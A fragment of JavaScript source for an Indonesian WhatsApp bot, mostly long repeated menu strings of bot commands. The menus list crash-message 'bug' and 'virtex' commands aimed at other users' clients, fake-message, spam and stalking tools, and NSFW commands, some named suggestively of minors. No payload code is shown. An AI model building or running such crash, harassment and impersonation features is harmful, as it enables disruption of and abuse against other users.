   if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})          
   katalog(`╭─❒ *LIST MENU BOT*
│_/\_ ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙊𝙒𝙉𝙀𝙍 
│_/\_ ${prefix}off
│_/\_ ${prefix}isbaileys
│_/\_ ${prefix}banchat
│_/\_ ${prefix}unbanchat
│_/\_ ${prefix}listbc
│_/\_ ${prefix}setcmd
│_/\_ ${prefix}delcmd
│_/\_ ${prefix}listcmd
│_/\_ ${prefix}restart
│_/\_ ${prefix}antidelete on|off
│_/\_ ${prefix}autoketik on|off
│_/\_ ${prefix}autoread gc in / gc off
│_/\_ ${prefix}autovn on|off
│_/\_ ${prefix}anticall on|off
│_/\_ ${prefix}getcaption
│_/\_ ${prefix}bugkatalog
│_/\_ ${prefix}buggc id grup
│_/\_ ${prefix}bugpc *only pc*
│_/\_ ${prefix}troliv1
│_/\_ ${prefix}troliv2 *total*
│_/\_ ${prefix}virtex
│_/\_ ${prefix}on
│_/\_ ${prefix}status
│_/\_ ${prefix}setthumb
│_/\_ ${prefix}settarget
│_/\_ ${prefix}setfakeimg
│_/\_ ${prefix}setreply
│_/\_ ${prefix}hacked nama
│_/\_ ${prefix}setprefix
│_/\_ ${prefix}mode /public-self/
│_/\_ ${prefix}term <code>
│_/\_ ${prefix}eval <code>
│_/\_ ${prefix}colongsw reply
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙂𝙍𝙐𝙋 
│_/\_ ${prefix}grup 
│_/\_ ${prefix}promote 
│_/\_ ${prefix}demote 
│_/\_ ${prefix}setdesc
│_/\_ ${prefix}setname
│_/\_ ${prefix}nsfw 1/0
│_/\_ ${prefix}kick 
│_/\_ ${prefix}add 
│_/\_ ${prefix}getbio
│_/\_ ${prefix}getname 
│_/\_ ${prefix}reminder 
│_/\_ ${prefix}listonline
│_/\_ ${prefix}sider reply
│_/\_ ${prefix}antilink on|off
│_/\_ ${prefix}tod
│_/\_ ${prefix}tospam jumlah
│_/\_ ${prefix}antihidetag on|off
│_/\_ ${prefix}antiviewonce on|off
│_/\_ ${prefix}antivirtex on|off
│_/\_ ${prefix}autojoin on|off
│_/\_ ${prefix}kickarea
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙈𝘼𝙆𝙀𝙍 
│_/\_ ${prefix}sticker
│_/\_ ${prefix}swm author|packname
│_/\_ ${prefix}take author|packname
│_/\_ ${prefix}fdeface
│_/\_ ${prefix}attp teks
│_/\_ ${prefix}fancytext teks
│_/\_ ${prefix}emoji 
│_/\_ ${prefix}halloween teks
│_/\_ ${prefix}vampire teks
│_/\_ ${prefix}codetxt teks
│_/\_ ${prefix}googletxt
│_/\_ ${prefix}spiderman teks
│_/\_ ${prefix}express teks
│_/\_ ${prefix}maker2d2 teks
│_/\_ ${prefix}maker2d3 teks
│_/\_ ${prefix}maker2d4 teks
│_/\_ ${prefix}golden teks
│_/\_ ${prefix}flower teks
│_/\_ ${prefix}dance
│_/\_ ${prefix}wooden teks
│_/\_ ${prefix}burn
│_/\_ ${prefix}glow teks
│_/\_ ${prefix}summer teks
│_/\_ ${prefix}neon teks
│_/\_ ${prefix}coffeecup teks
│_/\_ ${prefix}coffeecup2 teks
│_/\_ ${prefix}battlefield teks|teks
│_/\_ ${prefix}googletxt2 teks
│_/\_ ${prefix}transformer teks
│_/\_ ${prefix}nulis teks
│_/\_ ${prefix}text3d teks
│_/\_ ${prefix}warrior teks
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝘾𝙊𝙉𝙑𝙀𝙍𝙏 
│_/\_ ${prefix}tomp3
│_/\_ ${prefix}tomp4
│_/\_ ${prefix}toimg
│_/\_ ${prefix}slow
│_/\_ ${prefix}fast
│_/\_ ${prefix}reverse
│_/\_ ${prefix}tourl
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝘿𝙊𝙒𝙉𝙇𝙊𝘼𝘿𝙀𝙍 
│_/\_ ${prefix}play query
│_/\_ ${prefix}ytmp4 link
│_/\_ ${prefix}ytmp3 link
│_/\_ ${prefix}video query
│_/\_ ${prefix}instagram link
│_/\_ ${prefix}twitter
│_/\_ ${prefix}facebook link
│_/\_ ${prefix}tiktokdl
│_/\_ ${prefix}tiktokmusic
│_/\_ ${prefix}ytsearch
│_/\_ ${prefix}play
│_/\_ ${prefix}ytmp3
│_/\_ ${prefix}ytmp4
│_/\_ ${prefix}igdl
│_/\_ ${prefix}fbdl
│_/\_ ${prefix}brainly
│_/\_ ${prefix}lirik
│_/\_ ${prefix}tiktoknowm
│_/\_ ${prefix}pinterest
│_/\_ ${prefix}spotifysearch
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙏𝘼𝙂 
│_/\_ ${prefix}hidetag
│_/\_ ${prefix}kontag
│_/\_ ${prefix}sticktag
│_/\_ ${prefix}totag
│
│  *SEARCH MENU*
│_/\_ ${prefix}kbbi
│_/\_ ${prefix}jarak
│_/\_ ${prefix}translate
│_/\_ ${prefix}infogempa
│_/\_ ${prefix}covidindo
│_/\_ ${prefix}covidglobal
│_/\_ ${prefix}wikipedia
│_/\_ ${prefix}playstore
│_/\_ ${prefix}kodepos
│_/\_ ${prefix}newsinfo
│_/\_ ${prefix}jadwaltv
│_/\_ ${prefix}cuaca
│_/\_ ${prefix}gimage
│_/\_ ${prefix}wallpapersearch
│_/\_ ${prefix}shopee
│_/\_ ${prefix}google
│
│ *RANDOM MENU
│_/\_ ${prefix}owner
│_/\_ ${prefix}sewabot
│_/\_ ${prefix}report
│_/\_ ${prefix}runtime
│_/\_ ${prefix}speed 
│_/\_ ${prefix}sc
│_/\_ ${prefix}rulesbot
│_/\_ ${prefix}sharelock
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙐𝙋𝙎𝙒 
│_/\_ ${prefix}upswteks
│_/\_ ${prefix}upswlokasi
│_/\_ ${prefix}upswsticker
│_/\_ ${prefix}upswimage
│_/\_ ${prefix}upswvideo
│_/\_ ${prefix}upswgif
│
│  *GABUT MENU*
│_/\_ ${prefix}suit
│_/\_ ${prefix}artinama
│_/\_ ${prefix}jodoh
│_/\_ ${prefix}tebakumur
│_/\_ ${prefix}weton
│_/\_ ${prefix}jadian
│_/\_ ${prefix}faktaunik
│_/\_ ${prefix}anime
│_/\_ ${prefix}truth
│_/\_ ${prefix}dare
│_/\_ ${prefix}dadu
│_/\_ ${prefix}tebakgambar
│_/\_ ${prefix}tembak udara 
│_/\_ ${prefix}tembak laut
│_/\_ ${prefix}tembak darat
│_/\_ ${prefix}slot
│_/\_ ${prefix}quotes
│_/\_ ${prefix}quotesanime
│_/\_ ${prefix}quotesdilan
│_/\_ ${prefix}quotesimage
│_/\_ ${prefix}katabijak
│_/\_ ${prefix}randomnama
│_/\_ ${prefix}meme
│_/\_ ${prefix}darkjoke
│_/\_ ${prefix}memeindo
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙁𝙐𝙉 
│_/\_ ${prefix}fitnah
│_/\_ ${prefix}fitnahpc
│_/\_ ${prefix}kontak 0|p
│_/\_ ${prefix}lolivid
│_/\_ ${prefix}suit
│_/\_ ${prefix}toxic
│_/\_ ${prefix}flock
│_/\_ ${prefix}pantun
│_/\_ ${prefix}dadu
│_/\_ ${prefix}asupan
│_/\_ ${prefix}viewonce
│_/\_ ${prefix}detikvn number
│_/\_ ${prefix}detikvideo number
│_/\_ ${prefix}hbd
│
│  *STALK MENU*
│_/\_ ${prefix}igstalk
│_/\_ ${prefix}mlstalk
│_/\_ ${prefix}tkstalk
│_/\_ ${prefix}githubstalk
│_/\_ ${prefix}shortlink
│
│  *ASUPAN MENU*
│_/\_ ${prefix}asupan
│_/\_ ${prefix}asupancecan
│_/\_ ${prefix}asupanhijaber
│_/\_ ${prefix}asupansantuy
│_/\_ ${prefix}asupanukhti
│_/\_ ${prefix}asupanbocil
│_/\_ ${prefix}asupanghea
│_/\_ ${prefix}asupanrika
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙉𝙎𝙁𝙒 
│_/\_ ${prefix}yuri
│_/\_ ${prefix}hentai
│_/\_ ${prefix}anal
│_/\_ ${prefix}eroneko
│_/\_ ${prefix}lesbian
│_/\_ ${prefix}kitsune
│_/\_ ${prefix}bj
│_/\_ ${prefix}pussy
│_/\_ ${prefix}wallpaper
│_/\_ ${prefix}neko2
│_/\_ ${prefix}baka
│_/\_ ${prefix}slap
│_/\_ ${prefix}poke
│_/\_ ${prefix}keta
│_/\_ ${prefix}awoo
│_/\_ ${prefix}blowjob
│_/\_ ${prefix}megumin
│_/\_ ${prefix}neko
│_/\_ ${prefix}trapnime
│
│  *WIBU MENU*
│_/\_ ${prefix}kurumi
│_/\_ ${prefix}deku
│_/\_ ${prefix}sao
│_/\_ ${prefix}chika
│_/\_ ${prefix}kaneki
│_/\_ ${prefix}touka
│_/\_ ${prefix}eren
│_/\_ ${prefix}naruto
│_/\_ ${prefix}minato
│_/\_ ${prefix}sagiri
│_/\_ ${prefix}sasuke
│_/\_ ${prefix}sakura
│_/\_ ${prefix}tsunade
│_/\_ ${prefix}gojosatoru
└──────[ GITHUB ]──────❒
│_/\_Script Ory :
│_/\_https://github.com/Fauzibanh
│_/\_Notes : CARI SENDIRI:V
└──────────────────❒`)
break
case 'location':
groups = itsmevall.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = itsmevall.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await itsmevall.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await itsmevall.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `╭─❒ *LIST ALL MENU BOT*
│_/\_ ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙊𝙒𝙉𝙀𝙍 
│_/\_ ${prefix}off
│_/\_ ${prefix}isbaileys
│_/\_ ${prefix}banchat
│_/\_ ${prefix}unbanchat
│_/\_ ${prefix}listbc
│_/\_ ${prefix}setcmd
│_/\_ ${prefix}delcmd
│_/\_ ${prefix}listcmd
│_/\_ ${prefix}restart
│_/\_ ${prefix}antidelete on|off
│_/\_ ${prefix}autoketik on|off
│_/\_ ${prefix}autoread gc in / gc off
│_/\_ ${prefix}autovn on|off
│_/\_ ${prefix}anticall on|off
│_/\_ ${prefix}getcaption
│_/\_ ${prefix}bugkatalog
│_/\_ ${prefix}buggc id grup
│_/\_ ${prefix}bugpc *only pc*
│_/\_ ${prefix}troliv1
│_/\_ ${prefix}troliv2 *total*
│_/\_ ${prefix}virtex
│_/\_ ${prefix}on
│_/\_ ${prefix}status
│_/\_ ${prefix}setthumb
│_/\_ ${prefix}settarget
│_/\_ ${prefix}setfakeimg
│_/\_ ${prefix}setreply
│_/\_ ${prefix}hacked nama
│_/\_ ${prefix}setprefix
│_/\_ ${prefix}mode /public-self/
│_/\_ ${prefix}term <code>
│_/\_ ${prefix}eval <code>
│_/\_ ${prefix}colongsw reply
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙂𝙍𝙐𝙋 
│_/\_ ${prefix}grup 
│_/\_ ${prefix}promote 
│_/\_ ${prefix}demote 
│_/\_ ${prefix}setdesc
│_/\_ ${prefix}setname
│_/\_ ${prefix}nsfw 1/0
│_/\_ ${prefix}kick 
│_/\_ ${prefix}add 
│_/\_ ${prefix}getbio
│_/\_ ${prefix}getname 
│_/\_ ${prefix}reminder 
│_/\_ ${prefix}listonline
│_/\_ ${prefix}sider reply
│_/\_ ${prefix}antilink on|off
│_/\_ ${prefix}tod
│_/\_ ${prefix}tospam jumlah
│_/\_ ${prefix}antihidetag on|off
│_/\_ ${prefix}antiviewonce on|off
│_/\_ ${prefix}antivirtex on|off
│_/\_ ${prefix}autojoin on|off
│_/\_ ${prefix}kickarea
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙈𝘼𝙆𝙀𝙍 
│_/\_ ${prefix}sticker
│_/\_ ${prefix}swm author|packname
│_/\_ ${prefix}take author|packname
│_/\_ ${prefix}fdeface
│_/\_ ${prefix}attp teks
│_/\_ ${prefix}fancytext teks
│_/\_ ${prefix}emoji 
│_/\_ ${prefix}halloween teks
│_/\_ ${prefix}vampire teks
│_/\_ ${prefix}codetxt teks
│_/\_ ${prefix}googletxt
│_/\_ ${prefix}spiderman teks
│_/\_ ${prefix}express teks
│_/\_ ${prefix}maker2d2 teks
│_/\_ ${prefix}maker2d3 teks
│_/\_ ${prefix}maker2d4 teks
│_/\_ ${prefix}golden teks
│_/\_ ${prefix}flower teks
│_/\_ ${prefix}dance
│_/\_ ${prefix}wooden teks
│_/\_ ${prefix}burn
│_/\_ ${prefix}glow teks
│_/\_ ${prefix}summer teks
│_/\_ ${prefix}neon teks
│_/\_ ${prefix}coffeecup teks
│_/\_ ${prefix}coffeecup2 teks
│_/\_ ${prefix}battlefield teks|teks
│_/\_ ${prefix}googletxt2 teks
│_/\_ ${prefix}transformer teks
│_/\_ ${prefix}nulis teks
│_/\_ ${prefix}text3d teks
│_/\_ ${prefix}warrior teks
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝘾𝙊𝙉𝙑𝙀𝙍𝙏 
│_/\_ ${prefix}tomp3
│_/\_ ${prefix}tomp4
│_/\_ ${prefix}toimg
│_/\_ ${prefix}slow
│_/\_ ${prefix}fast
│_/\_ ${prefix}reverse
│_/\_ ${prefix}tourl
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝘿𝙊𝙒𝙉𝙇𝙊𝘼𝘿𝙀𝙍 
│_/\_ ${prefix}play query
│_/\_ ${prefix}ytmp4 link
│_/\_ ${prefix}ytmp3 link
│_/\_ ${prefix}video query
│_/\_ ${prefix}instagram link
│_/\_ ${prefix}twitter
│_/\_ ${prefix}facebook link
│_/\_ ${prefix}tiktokdl
│_/\_ ${prefix}tiktokmusic
│_/\_ ${prefix}ytsearch
│_/\_ ${prefix}play
│_/\_ ${prefix}ytmp3
│_/\_ ${prefix}ytmp4
│_/\_ ${prefix}igdl
│_/\_ ${prefix}fbdl
│_/\_ ${prefix}brainly
│_/\_ ${prefix}lirik
│_/\_ ${prefix}tiktoknowm
│_/\_ ${prefix}pinterest
│_/\_ ${prefix}spotifysearch
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙏𝘼𝙂 
│_/\_ ${prefix}hidetag
│_/\_ ${prefix}kontag
│_/\_ ${prefix}sticktag
│_/\_ ${prefix}totag
│
│  𝐒𝐞𝐚𝐫𝐜𝐡 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}kbbi
│_/\_ ${prefix}jarak
│_/\_ ${prefix}translate
│_/\_ ${prefix}infogempa
│_/\_ ${prefix}covidindo
│_/\_ ${prefix}covidglobal
│_/\_ ${prefix}wikipedia
│_/\_ ${prefix}playstore
│_/\_ ${prefix}kodepos
│_/\_ ${prefix}newsinfo
│_/\_ ${prefix}jadwaltv
│_/\_ ${prefix}cuaca
│_/\_ ${prefix}gimage
│_/\_ ${prefix}wallpapersearch
│_/\_ ${prefix}shopee
│_/\_ ${prefix}google
│
│ 𝐑𝐚𝐧𝐝𝐨𝐦 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}owner
│_/\_ ${prefix}sewabot
│_/\_ ${prefix}report
│_/\_ ${prefix}runtime
│_/\_ ${prefix}speed 
│_/\_ ${prefix}sc
│_/\_ ${prefix}rulesbot
│_/\_ ${prefix}sharelock
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙐𝙋𝙎𝙒 
│_/\_ ${prefix}upswteks
│_/\_ ${prefix}upswlokasi
│_/\_ ${prefix}upswsticker
│_/\_ ${prefix}upswimage
│_/\_ ${prefix}upswvideo
│_/\_ ${prefix}upswgif
│
│  𝐆𝐚𝐛𝐮𝐭 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}suit
│_/\_ ${prefix}artinama
│_/\_ ${prefix}jodoh
│_/\_ ${prefix}tebakumur
│_/\_ ${prefix}weton
│_/\_ ${prefix}jadian
│_/\_ ${prefix}faktaunik
│_/\_ ${prefix}anime
│_/\_ ${prefix}truth
│_/\_ ${prefix}dare
│_/\_ ${prefix}dadu
│_/\_ ${prefix}tebakgambar
│_/\_ ${prefix}tembak udara 
│_/\_ ${prefix}tembak laut
│_/\_ ${prefix}tembak darat
│_/\_ ${prefix}slot
│_/\_ ${prefix}quotes
│_/\_ ${prefix}quotesanime
│_/\_ ${prefix}quotesdilan
│_/\_ ${prefix}quotesimage
│_/\_ ${prefix}katabijak
│_/\_ ${prefix}randomnama
│_/\_ ${prefix}meme
│_/\_ ${prefix}darkjoke
│_/\_ ${prefix}memeindo
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙁𝙐𝙉 
│_/\_ ${prefix}fitnah
│_/\_ ${prefix}fitnahpc
│_/\_ ${prefix}kontak 0|p
│_/\_ ${prefix}lolivid
│_/\_ ${prefix}suit
│_/\_ ${prefix}toxic
│_/\_ ${prefix}flock
│_/\_ ${prefix}pantun
│_/\_ ${prefix}dadu
│_/\_ ${prefix}asupan
│_/\_ ${prefix}viewonce
│_/\_ ${prefix}detikvn number
│_/\_ ${prefix}detikvideo number
│_/\_ ${prefix}hbd
│
│  𝐒𝐭𝐚𝐥𝐤 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}igstalk
│_/\_ ${prefix}mlstalk
│_/\_ ${prefix}tkstalk
│_/\_ ${prefix}githubstalk
│_/\_ ${prefix}shortlink
│
│  𝐀𝐬𝐮𝐩𝐚𝐧 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}asupan
│_/\_ ${prefix}asupancecan
│_/\_ ${prefix}asupanhijaber
│_/\_ ${prefix}asupansantuy
│_/\_ ${prefix}asupanukhti
│_/\_ ${prefix}asupanbocil
│_/\_ ${prefix}asupanghea
│_/\_ ${prefix}asupanrika
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙉𝙎𝙁𝙒 
│_/\_ ${prefix}yuri
│_/\_ ${prefix}hentai
│_/\_ ${prefix}anal
│_/\_ ${prefix}eroneko
│_/\_ ${prefix}lesbian
│_/\_ ${prefix}kitsune
│_/\_ ${prefix}bj
│_/\_ ${prefix}pussy
│_/\_ ${prefix}wallpaper
│_/\_ ${prefix}neko2
│_/\_ ${prefix}baka
│_/\_ ${prefix}slap
│_/\_ ${prefix}poke
│_/\_ ${prefix}keta
│_/\_ ${prefix}awoo
│_/\_ ${prefix}blowjob
│_/\_ ${prefix}megumin
│_/\_ ${prefix}neko
│_/\_ ${prefix}trapnime
│
│  𝐖𝐢𝐛𝐮 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}kurumi
│_/\_ ${prefix}deku
│_/\_ ${prefix}sao
│_/\_ ${prefix}chika
│_/\_ ${prefix}kaneki
│_/\_ ${prefix}touka
│_/\_ ${prefix}eren
│_/\_ ${prefix}naruto
│_/\_ ${prefix}minato
│_/\_ ${prefix}sagiri
│_/\_ ${prefix}sasuke
│_/\_ ${prefix}sakura
│_/\_ ${prefix}tsunade
│_/\_ ${prefix}gojosatoru
└──────[ GITHUB ]──────❒
│_/\_Script Ory :
│_/\_https://github.com/Fauzibanh
│_/\_Notes : CARI SENDIRI:V
└──────────────────❒`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:ofrply}, [{buttonId:`${prefix}owner`,buttonText:{displayText:'Owner🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'allmenu2':
var menu = `Hai kak ${pushname}
Jangan lupa donasi ya kak
│────────────❒
│_/\_ ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙊𝙒𝙉𝙀𝙍 
│_/\_ ${prefix}off
│_/\_ ${prefix}isbaileys
│_/\_ ${prefix}banchat
│_/\_ ${prefix}unbanchat
│_/\_ ${prefix}listbc
│_/\_ ${prefix}setcmd
│_/\_ ${prefix}delcmd
│_/\_ ${prefix}listcmd
│_/\_ ${prefix}restart
│_/\_ ${prefix}antidelete on|off
│_/\_ ${prefix}autoketik on|off
│_/\_ ${prefix}autoread gc in / gc off
│_/\_ ${prefix}autovn on|off
│_/\_ ${prefix}anticall on|off
│_/\_ ${prefix}getcaption
│_/\_ ${prefix}bugkatalog
│_/\_ ${prefix}buggc id grup
│_/\_ ${prefix}bugpc *only pc*
│_/\_ ${prefix}troliv1
│_/\_ ${prefix}troliv2 *total*
│_/\_ ${prefix}virtex
│_/\_ ${prefix}on
│_/\_ ${prefix}status
│_/\_ ${prefix}setthumb
│_/\_ ${prefix}settarget
│_/\_ ${prefix}setfakeimg
│_/\_ ${prefix}setreply
│_/\_ ${prefix}hacked nama
│_/\_ ${prefix}setprefix
│_/\_ ${prefix}mode /public-self/
│_/\_ ${prefix}term <code>
│_/\_ ${prefix}eval <code>
│_/\_ ${prefix}colongsw reply
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙂𝙍𝙐𝙋 
│_/\_ ${prefix}grup 
│_/\_ ${prefix}promote 
│_/\_ ${prefix}demote 
│_/\_ ${prefix}setdesc
│_/\_ ${prefix}setname
│_/\_ ${prefix}nsfw 1/0
│_/\_ ${prefix}kick 
│_/\_ ${prefix}add 
│_/\_ ${prefix}getbio
│_/\_ ${prefix}getname 
│_/\_ ${prefix}reminder 
│_/\_ ${prefix}listonline
│_/\_ ${prefix}sider reply
│_/\_ ${prefix}antilink on|off
│_/\_ ${prefix}tod
│_/\_ ${prefix}tospam jumlah
│_/\_ ${prefix}antihidetag on|off
│_/\_ ${prefix}antiviewonce on|off
│_/\_ ${prefix}antivirtex on|off
│_/\_ ${prefix}autojoin on|off
│_/\_ ${prefix}kickarea
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙈𝘼𝙆𝙀𝙍 
│_/\_ ${prefix}sticker
│_/\_ ${prefix}swm author|packname
│_/\_ ${prefix}take author|packname
│_/\_ ${prefix}fdeface
│_/\_ ${prefix}attp teks
│_/\_ ${prefix}fancytext teks
│_/\_ ${prefix}emoji 
│_/\_ ${prefix}halloween teks
│_/\_ ${prefix}vampire teks
│_/\_ ${prefix}codetxt teks
│_/\_ ${prefix}googletxt
│_/\_ ${prefix}spiderman teks
│_/\_ ${prefix}express teks
│_/\_ ${prefix}maker2d2 teks
│_/\_ ${prefix}maker2d3 teks
│_/\_ ${prefix}maker2d4 teks
│_/\_ ${prefix}golden teks
│_/\_ ${prefix}flower teks
│_/\_ ${prefix}dance
│_/\_ ${prefix}wooden teks
│_/\_ ${prefix}burn
│_/\_ ${prefix}glow teks
│_/\_ ${prefix}summer teks
│_/\_ ${prefix}neon teks
│_/\_ ${prefix}coffeecup teks
│_/\_ ${prefix}coffeecup2 teks
│_/\_ ${prefix}battlefield teks|teks
│_/\_ ${prefix}googletxt2 teks
│_/\_ ${prefix}transformer teks
│_/\_ ${prefix}nulis teks
│_/\_ ${prefix}text3d teks
│_/\_ ${prefix}warrior teks
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝘾𝙊𝙉𝙑𝙀𝙍𝙏 
│_/\_ ${prefix}tomp3
│_/\_ ${prefix}tomp4
│_/\_ ${prefix}toimg
│_/\_ ${prefix}slow
│_/\_ ${prefix}fast
│_/\_ ${prefix}reverse
│_/\_ ${prefix}tourl
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝘿𝙊𝙒𝙉𝙇𝙊𝘼𝘿𝙀𝙍 
│_/\_ ${prefix}play query
│_/\_ ${prefix}ytmp4 link
│_/\_ ${prefix}ytmp3 link
│_/\_ ${prefix}video query
│_/\_ ${prefix}instagram link
│_/\_ ${prefix}twitter
│_/\_ ${prefix}facebook link
│_/\_ ${prefix}tiktokdl
│_/\_ ${prefix}tiktokmusic
│_/\_ ${prefix}ytsearch
│_/\_ ${prefix}play
│_/\_ ${prefix}ytmp3
│_/\_ ${prefix}ytmp4
│_/\_ ${prefix}igdl
│_/\_ ${prefix}fbdl
│_/\_ ${prefix}brainly
│_/\_ ${prefix}lirik
│_/\_ ${prefix}tiktoknowm
│_/\_ ${prefix}pinterest
│_/\_ ${prefix}spotifysearch
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙏𝘼𝙂 
│_/\_ ${prefix}hidetag
│_/\_ ${prefix}kontag
│_/\_ ${prefix}sticktag
│_/\_ ${prefix}totag
│
│  𝐒𝐞𝐚𝐫𝐜𝐡 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}kbbi
│_/\_ ${prefix}jarak
│_/\_ ${prefix}translate
│_/\_ ${prefix}infogempa
│_/\_ ${prefix}covidindo
│_/\_ ${prefix}covidglobal
│_/\_ ${prefix}wikipedia
│_/\_ ${prefix}playstore
│_/\_ ${prefix}kodepos
│_/\_ ${prefix}newsinfo
│_/\_ ${prefix}jadwaltv
│_/\_ ${prefix}cuaca
│_/\_ ${prefix}gimage
│_/\_ ${prefix}wallpapersearch
│_/\_ ${prefix}shopee
│_/\_ ${prefix}google
│
│ 𝐑𝐚𝐧𝐝𝐨𝐦 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}owner
│_/\_ ${prefix}sewabot
│_/\_ ${prefix}report
│_/\_ ${prefix}runtime
│_/\_ ${prefix}speed 
│_/\_ ${prefix}sc
│_/\_ ${prefix}rulesbot
│_/\_ ${prefix}sharelock
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙐𝙋𝙎𝙒 
│_/\_ ${prefix}upswteks
│_/\_ ${prefix}upswlokasi
│_/\_ ${prefix}upswsticker
│_/\_ ${prefix}upswimage
│_/\_ ${prefix}upswvideo
│_/\_ ${prefix}upswgif
│
│  𝐆𝐚𝐛𝐮𝐭 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}suit
│_/\_ ${prefix}artinama
│_/\_ ${prefix}jodoh
│_/\_ ${prefix}tebakumur
│_/\_ ${prefix}weton
│_/\_ ${prefix}jadian
│_/\_ ${prefix}faktaunik
│_/\_ ${prefix}anime
│_/\_ ${prefix}truth
│_/\_ ${prefix}dare
│_/\_ ${prefix}dadu
│_/\_ ${prefix}tebakgambar
│_/\_ ${prefix}tembak udara 
│_/\_ ${prefix}tembak laut
│_/\_ ${prefix}tembak darat
│_/\_ ${prefix}slot
│_/\_ ${prefix}quotes
│_/\_ ${prefix}quotesanime
│_/\_ ${prefix}quotesdilan
│_/\_ ${prefix}quotesimage
│_/\_ ${prefix}katabijak
│_/\_ ${prefix}randomnama
│_/\_ ${prefix}meme
│_/\_ ${prefix}darkjoke
│_/\_ ${prefix}memeindo
│
│  ⬣ 𝙈𝘼𝙆𝙄𝙉𝙂 𝙁𝙀𝘼𝙏𝙐𝙍𝙀𝙎
│_/\_ ${prefix}sticker
│_/\_ ${prefix}swm author|packname
│_/\_ ${prefix}take author|packname
│_/\_ ${prefix}fdeface
│_/\_ ${prefix}emoji
│_/\_ ${prefix}golden text
│_/\_ ${prefix}flower text
│_/\_ ${prefix}wooden text
│_/\_ ${prefix}burn text
│_/\_ ${prefix}glow text
│_/\_ ${prefix}summer text
│_/\_ ${prefix}neon text
│_/\_ ${prefix}coffeecup text
│_/\_ ${prefix}coffeecup2 text
│_/\_ ${prefix}battlefield text|text
│_/\_ ${prefix}googletxt2 text|text
│_/\_ ${prefix}transformer text|text
│_/\_ ${prefix}write text
│_/\_ ${prefix}waifu
│_/\_ ${prefix}phlogo text|*text
│_/\_ ${prefix}tfire text
│_/\_ ${prefix}phcomment text|text
│_/\_ ${prefix}wolf text
│_/\_ ${prefix}ytgol text
│_/\_ ${prefix}ytsilver text
│_/\_ ${prefix}t3d text
│_/\_ ${prefix}logoa text|text
│_/\_ ${prefix}marvel text|text
│_/\_ ${prefix}leavest text
│_/\_ ${prefix}neon2 text
│_/\_ ${prefix}wall text
│_/\_ ${prefix}notewrite text
│_/\_ ${prefix}pubglogo text|text
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙁𝙐𝙉 
│_/\_ ${prefix}fitnah
│_/\_ ${prefix}fitnahpc
│_/\_ ${prefix}kontak 0|p
│_/\_ ${prefix}lolivid
│_/\_ ${prefix}suit
│_/\_ ${prefix}toxic
│_/\_ ${prefix}flock
│_/\_ ${prefix}pantun
│_/\_ ${prefix}dadu
│_/\_ ${prefix}asupan
│_/\_ ${prefix}viewonce
│_/\_ ${prefix}detikvn number
│_/\_ ${prefix}detikvideo number
│_/\_ ${prefix}hbd
│
│  𝐒𝐭𝐚𝐥𝐤 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}igstalk
│_/\_ ${prefix}mlstalk
│_/\_ ${prefix}tkstalk
│_/\_ ${prefix}githubstalk
│_/\_ ${prefix}shortlink
│
│  𝐀𝐬𝐮𝐩𝐚𝐧 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}asupan
│_/\_ ${prefix}asupancecan
│_/\_ ${prefix}asupanhijaber
│_/\_ ${prefix}asupansantuy
│_/\_ ${prefix}asupanukhti
│_/\_ ${prefix}asupanbocil
│_/\_ ${prefix}asupanghea
│_/\_ ${prefix}asupanrika
│
